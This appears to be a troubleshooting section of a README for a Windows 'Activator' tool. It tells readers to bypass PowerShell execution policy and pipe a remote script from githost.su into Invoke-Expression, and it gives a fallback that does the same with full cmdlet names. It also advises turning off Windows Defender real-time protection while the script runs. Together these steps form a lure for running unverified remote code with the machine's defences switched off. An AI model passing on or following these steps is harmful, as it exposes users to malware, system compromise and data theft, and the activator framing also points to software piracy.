## 🔍 Troubleshooting & Common Errors

### 📌 Bypass Execution Policy (Blocking Unsigned Scripts)
If your system blocks the launch due to built-in execution policy constraints, enforce a bypass using this command:
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://githost.su/powershell/Activator.ps1 | iex"
```

### 📌 Error: "irm is not recognized..." (PowerShell 2.0 Legacy)
In older legacy environments where aliases are missing, use explicit full system cmdlets:
```powershell
Invoke-RestMethod https://githost.su/powershell/Activator.ps1 | Invoke-Expression
```


### 📌 Antivirus or SmartScreen Interception
Automated deployment routines can sometimes trigger proactive security heuristics. Temporarily disable "Real-time protection" within your Windows Defender settings during setup, then re-enable it immediately after completion.
